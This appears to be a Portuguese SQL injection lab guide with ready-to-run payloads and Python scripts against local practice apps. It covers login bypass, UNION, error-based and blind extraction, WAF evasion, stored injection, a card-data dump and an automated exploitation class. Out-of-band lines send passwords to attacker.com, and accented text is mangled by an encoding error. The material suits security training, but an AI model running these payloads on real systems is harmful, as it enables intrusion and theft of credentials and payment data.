# üõ†Ô∏è SQL Injection - Guia de Explora√ß√£o

## üìã √çndice

1. [Basic Level - Explora√ß√£o](#basic-level)
2. [Intermediate Level - Explora√ß√£o](#intermediate-level)
3. [T√©cnicas Avan√ßadas](#t√©cnicas-avan√ßadas)
4. [Automatiza√ß√£o](#automatiza√ß√£o)

---

## üü¢ Basic Level - Explora√ß√£o

### Setup

```bash
# Terminal 1
cd learn/labs/guided/01-sql-injection
python3 basic_app.py

# Terminal 2
# Pronto para explorar em http://localhost:5010
```

### Objetivo 1: Authentication Bypass

#### Passo 1: Identificar Vulnerabilidade

Teste b√°sico com aspa simples:
```
Username: admin'
Password: qualquer
```

**Resultado esperado**: Erro SQL revelando query:
```
SQL Error: near "'": syntax error
Query: SELECT * FROM users WHERE username = 'admin'' AND password = 'qualquer'
```

‚úÖ **Confirmado**: Aplica√ß√£o √© vulner√°vel a SQLi!

#### Passo 2: Comentar Resto da Query

```
Username: admin'--
Password: qualquer
```

**Query executada**:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'qualquer'
```

O `--` comenta o resto, ignorando verifica√ß√£o de senha!

**Alternativas**:
```
admin'#
admin'/*
admin';--
```

#### Passo 3: OR 1=1 (Always True)

```
Username: admin' OR '1'='1
Password: qualquer
```

**Query executada**:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'qualquer'
```

‚úÖ **Flag obtida**: `FLAG{basic_sqli_auth_bypass}`

#### Script Python

```python
#!/usr/bin/env python3
import requests

URL = 'http://localhost:5010/login'

payloads = [
    ("admin'--", "qualquer"),
    ("admin'#", "qualquer"),
    ("admin' OR '1'='1", "qualquer"),
    ("' OR 1=1--", "qualquer"),
]

for username, password in payloads:
    data = {'username': username, 'password': password}
    r = requests.post(URL, data=data)

    if 'Login Successful' in r.text:
        print(f"[+] SUCESSO com payload: {username}")
        if 'FLAG{' in r.text:
            import re
            flag = re.search(r'FLAG\{[^}]+\}', r.text).group()
            print(f"[+] Flag: {flag}")
        break
```

---

### Objetivo 2: Data Extraction com UNION SELECT

#### Passo 1: Descobrir N√∫mero de Colunas

Teste no endpoint `/search`:

```
?q=test' ORDER BY 1--
?q=test' ORDER BY 2--
?q=test' ORDER BY 3--
...
?q=test' ORDER BY 7--  ‚Üê Erro! Significa 6 colunas
```

OU use UNION SELECT:

```
?q=test' UNION SELECT 1,2,3,4,5,6--
```

Se funcionar sem erro, tem 6 colunas!

#### Passo 2: Identificar Colunas Vis√≠veis

```
?q=test' UNION SELECT 1,2,3,4,5,6--
```

Veja quais n√∫meros aparecem na tela. Essas s√£o as colunas onde podemos extrair dados.

#### Passo 3: Extrair Vers√£o do Banco

```
?q=test' UNION SELECT 1,sqlite_version(),3,4,5,6--
```

**Resultado**: Vers√£o do SQLite aparece no lugar do n√∫mero 2.

#### Passo 4: Listar Todas as Tabelas

```
?q=test' UNION SELECT 1,name,sql,4,5,6 FROM sqlite_master WHERE type='table'--
```

**Resultado**: Descobre tabelas: `users`, `secrets`

#### Passo 5: Extrair Estrutura da Tabela

```
?q=test' UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE type='table' AND name='secrets'--
```

**Resultado**: Schema da tabela secrets:
```sql
CREATE TABLE secrets (
    id INTEGER PRIMARY KEY,
    title TEXT,
    content TEXT,
    secret_key TEXT
)
```

#### Passo 6: Extrair Dados Secretos

```
?q=test' UNION SELECT 1,title,content,secret_key,5,6 FROM secrets--
```

‚úÖ **Flags obtidas**:
- `FLAG{union_based_sqli}`
- `FLAG{basic_sqli_found}`
- `FLAG{error_based_sqli}`

#### Script Completo

```python
#!/usr/bin/env python3
"""
UNION-based SQL Injection Exploit
"""
import requests
import re

BASE_URL = 'http://localhost:5010'

def exploit_union_sqli():
    print("[*] Iniciando UNION-based SQLi exploitation...")

    # Passo 1: Descobrir tabelas
    print("\n[*] Descobrindo tabelas...")
    payload = "test' UNION SELECT 1,name,type,4,5,6 FROM sqlite_master WHERE type='table'--"
    r = requests.get(f'{BASE_URL}/search', params={'q': payload})

    tables = re.findall(r'<strong>Username:</strong> (\w+)', r.text)
    print(f"[+] Tabelas encontradas: {', '.join(tables)}")

    # Passo 2: Extrair estrutura da tabela secrets
    print("\n[*] Extraindo estrutura da tabela 'secrets'...")
    payload = "test' UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE name='secrets'--"
    r = requests.get(f'{BASE_URL}/search', params={'q': payload})
    print("[+] Estrutura obtida")

    # Passo 3: Extrair todos os dados de secrets
    print("\n[*] Extraindo dados de 'secrets'...")
    payload = "test' UNION SELECT 1,title,content,secret_key,5,6 FROM secrets--"
    r = requests.get(f'{BASE_URL}/search', params={'q': payload})

    # Buscar flags
    flags = re.findall(r'FLAG\{[^}]+\}', r.text)
    print(f"\n[+] FLAGS ENCONTRADAS:")
    for flag in flags:
        print(f"    {flag}")

    # Extrair secrets
    secrets = re.findall(r'<strong>Email:</strong> ([^<]+)', r.text)
    print(f"\n[+] SECRETS EXTRA√çDOS:")
    for secret in secrets:
        print(f"    {secret}")

if __name__ == '__main__':
    exploit_union_sqli()
```

---

### Objetivo 3: Error-Based Extraction

Quando UNION n√£o funciona, use erros para extrair dados:

```
?q=test' AND 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INTEGER)--
```

Erro vai revelar o nome da primeira tabela!

#### Script

```python
def error_based_extraction(table_name):
    """Extrai dados usando error-based SQLi"""
    payload = f"test' AND 1=CAST((SELECT name FROM {table_name} LIMIT 1) AS INTEGER)--"
    r = requests.get(f'{BASE_URL}/search', params={'q': payload})

    # Parse do erro para extrair dado
    match = re.search(r'cannot cast (\w+)', r.text)
    if match:
        return match.group(1)
```

---

## üü° Intermediate Level - Explora√ß√£o

### Setup

```bash
python3 intermediate_app.py
# http://localhost:5011
```

### Desafio: WAF Bypass

O servidor tem WAF que bloqueia:
- `OR`, `AND`, `--`, `#`, `UNION`, `SELECT`

#### T√©cnica 1: Case Variation

```
Username: admin' oR '1'='1'--
```

WAF verifica apenas uppercase! `oR` bypassa.

#### T√©cnica 2: Coment√°rios Inline

```
Username: admin'/**/oR/**/1=1/**/--
```

#### T√©cnica 3: Equivalentes

```
Username: admin' || '1'='1
```

`||` √© concatena√ß√£o mas funciona como OR em alguns contextos.

#### Script de Bypass

```python
def bypass_waf_login():
    """Testa m√∫ltiplos payloads de WAF bypass"""
    bypasses = [
        "admin' oR '1'='1'--",
        "admin'/**/oR/**/1=1/**/--",
        "admin' Or '1'='1'--",
        "admin'%0AoR%0A'1'='1'--",  # newline
        "admin' || '1'='1'--",
    ]

    for payload in bypasses:
        data = {'username': payload, 'password': 'test'}
        r = requests.post('http://localhost:5011/login', data=data)

        if 'Login Success' in r.text:
            print(f"[+] WAF bypass com: {payload}")
            if 'FLAG{' in r.text:
                flag = re.search(r'FLAG\{[^}]+\}', r.text).group()
                print(f"[+] Flag: {flag}")
            return True

    return False
```

---

### Explora√ß√£o: Search com UNION

Endpoint `/search` tem WAF mas permite UNION bypassado:

```
?q=test' UnIoN SeLeCt 1,2,3,4--
```

Case mixing bypassa!

#### Extrair Dados de Pagamento

```python
def extract_payment_data():
    """Extrai dados sens√≠veis de cart√£o"""
    # Primeiro, faz login como admin
    bypass_waf_login()

    # Depois extrai via UNION
    payload = "test' UnIoN SeLeCt id,card_number,card_holder,cvv FrOm payments--"

    r = requests.get('http://localhost:5011/search', params={'q': payload})

    # Parse results
    cards = re.findall(r'<h3>(\d{4}-\d{4}-\d{4}-\d{4})</h3>', r.text)

    print(f"\n[!] CART√ïES EXTRA√çDOS:")
    for card in cards:
        print(f"    {card}")
```

---

### Explora√ß√£o: Stored SQLi em Reviews

Reviews s√£o armazenados e depois executados sem sanitiza√ß√£o!

#### Passo 1: Inject Payload no Review

```
POST /api/review
product_id=1
rating=5
comment=Great product' UNION SELECT 1,username,password,4,5 FROM users--
username=attacker
```

#### Passo 2: Trigger Execution

Acesse a p√°gina do produto:
```
GET /product/1
```

A query vai executar:
```sql
SELECT ... WHERE product_id = 1
```

E retorna todos os usu√°rios e senhas!

#### Script

```python
def stored_sqli_attack():
    """Explora Stored SQLi em reviews"""
    # Injeta payload malicioso
    payload_comment = "Great product' UNION SELECT 1,2,username,password,5 FROM users--"

    data = {
        'product_id': '1',
        'rating': '5',
        'comment': payload_comment,
        'username': 'attacker'
    }

    r = requests.post('http://localhost:5011/api/review', data=data)
    print("[+] Payload injetado em review")

    # Trigger - visualiza produto
    r = requests.get('http://localhost:5011/product/1')

    # Extrai dados
    users = re.findall(r'<p>([^<]+)</p>', r.text)
    print(f"[+] Dados extra√≠dos via Stored SQLi:")
    for user in users[:5]:
        print(f"    {user}")
```

---

## üöÄ T√©cnicas Avan√ßadas

### 1. Blind Boolean-Based SQLi

Quando n√£o h√° output direto, use true/false:

```python
def blind_boolean_sqli(target_query):
    """
    Extrai dados character por character usando boolean-based
    """
    result = ''
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    for position in range(1, 50):
        found = False

        for char in charset:
            # Testa se character na posi√ß√£o √© igual a char
            payload = f"admin' AND SUBSTR(({target_query}),{position},1)='{char}'--"

            r = requests.post(URL, data={'username': payload, 'password': 'x'})

            # Se login bem-sucedido, condi√ß√£o √© true
            if 'Login Successful' in r.text:
                result += char
                print(f"[+] Posi√ß√£o {position}: {char} -> {result}")
                found = True
                break

        if not found:
            break  # Fim da string

    return result

# Uso
password = blind_boolean_sqli("SELECT password FROM users WHERE username='admin'")
print(f"[+] Senha extra√≠da: {password}")
```

### 2. Time-Based Blind SQLi

```python
def blind_time_based_sqli(target_query):
    """
    Usa SLEEP() para extrair dados
    """
    import time

    result = ''
    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    for position in range(1, 50):
        for char in charset:
            # Se char correto, sleep 3 segundos
            # SQLite n√£o tem SLEEP, mas MySQL/PostgreSQL sim
            payload = f"admin' AND IF(SUBSTR(({target_query}),{position},1)='{char}',SLEEP(3),0)--"

            start = time.time()
            r = requests.post(URL, data={'username': payload, 'password': 'x'}, timeout=5)
            elapsed = time.time() - start

            if elapsed >= 2.5:  # Delay detectado
                result += char
                print(f"[+] Posi√ß√£o {position}: {char}")
                break

    return result
```

### 3. Out-of-Band SQLi

Exfiltra dados via DNS ou HTTP:

```sql
-- MySQL
' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\file'))--

-- PostgreSQL
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||password) FROM users--

-- SQL Server
'; DECLARE @data VARCHAR(8000); SELECT @data=password FROM users WHERE id=1; EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\file"')--
```

---

## ü§ñ Automatiza√ß√£o Completa

### Script Master

```python
#!/usr/bin/env python3
"""
SQL Injection - Automated Exploitation Framework
"""

import requests
import re
import time
from urllib.parse import urlencode

class SQLiExploiter:
    def __init__(self, base_url, endpoint='/login', param='username'):
        self.base_url = base_url
        self.endpoint = endpoint
        self.param = param
        self.session = requests.Session()

    def test_vulnerability(self):
        """Testa se endpoint √© vulner√°vel"""
        test_payloads = ["'", "''", "' OR '1'='1", "1' AND '1'='1"]

        for payload in test_payloads:
            data = {self.param: payload, 'password': 'test'}
            r = self.session.post(f'{self.base_url}{self.endpoint}', data=data)

            if 'error' in r.text.lower() or 'sql' in r.text.lower():
                print(f"[+] Vulner√°vel! Payload: {payload}")
                return True

        return False

    def find_columns(self):
        """Descobre n√∫mero de colunas"""
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"
            data = {self.param: payload, 'password': 'test'}
            r = self.session.post(f'{self.base_url}{self.endpoint}', data=data)

            if 'error' in r.text.lower():
                print(f"[+] N√∫mero de colunas: {i-1}")
                return i - 1

        return None

    def extract_tables(self, columns):
        """Extrai nomes das tabelas"""
        union = ','.join(['NULL'] * columns)
        union_parts = union.split(',')
        union_parts[1] = 'name'  # Assume segunda coluna √© vis√≠vel
        union = ','.join(union_parts)

        payload = f"' UNION SELECT {union} FROM sqlite_master WHERE type='table'--"
        data = {self.param: payload, 'password': 'test'}
        r = self.session.post(f'{self.base_url}{self.endpoint}', data=data)

        tables = re.findall(r'table_name_pattern', r.text)  # Ajuste regex
        print(f"[+] Tabelas: {tables}")
        return tables

    def dump_table(self, table_name, columns):
        """Extrai todos os dados de uma tabela"""
        payload = f"' UNION SELECT * FROM {table_name}--"
        data = {self.param: payload, 'password': 'test'}
        r = self.session.post(f'{self.base_url}{self.endpoint}', data=data)

        print(f"\n[+] Dados da tabela '{table_name}':")
        print(r.text[:500])

    def auto_exploit(self):
        """Explora√ß√£o autom√°tica completa"""
        print("[*] Iniciando explora√ß√£o automatizada...")

        if not self.test_vulnerability():
            print("[-] N√£o vulner√°vel")
            return

        columns = self.find_columns()
        if columns:
            tables = self.extract_tables(columns)
            for table in tables:
                self.dump_table(table, columns)

# Uso
exploiter = SQLiExploiter('http://localhost:5010', '/login', 'username')
exploiter.auto_exploit()
```

---

## üìä Compara√ß√£o de T√©cnicas

| T√©cnica | Quando Usar | Velocidade | Dificuldade |
|---------|-------------|------------|-------------|
| Error-based | Erros vis√≠veis | ‚ö°‚ö°‚ö° R√°pida | üü¢ F√°cil |
| UNION-based | Dados na resposta | ‚ö°‚ö°‚ö° R√°pida | üü¢ F√°cil |
| Boolean-based | Sem output direto | ‚ö° Lenta | üü° M√©dia |
| Time-based | Completamente blind | üêå Muito lenta | üî¥ Dif√≠cil |
| Out-of-band | Firewall bloqueia | ‚ö°‚ö° M√©dia | üî¥ Dif√≠cil |

---

## üéØ Checklist de Explora√ß√£o

- [ ] Testar aspas simples (')
- [ ] Verificar mensagens de erro
- [ ] Tentar coment√°rios (--, #, /*)
- [ ] Testar OR 1=1
- [ ] Descobrir n√∫mero de colunas (ORDER BY)
- [ ] Tentar UNION SELECT
- [ ] Listar tabelas (sqlite_master)
- [ ] Extrair estrutura das tabelas
- [ ] Dump de dados sens√≠veis
- [ ] Testar bypass de WAF
- [ ] Verificar stored SQLi
- [ ] Automatizar explora√ß√£o

---

## üîó Pr√≥ximos Passos

Ap√≥s dominar estas t√©cnicas:

1. Pratique em **PortSwigger Academy** - Labs gratuitos
2. Use **SQLMap** para automatiza√ß√£o avan√ßada
3. Leia sobre **NoSQL Injection** (MongoDB, etc.)
4. Estude **ORM Injection** (SQLAlchemy, Hibernate)

---

**Continue para**: [exercises.md](exercises.md) - Exerc√≠cios pr√°ticos
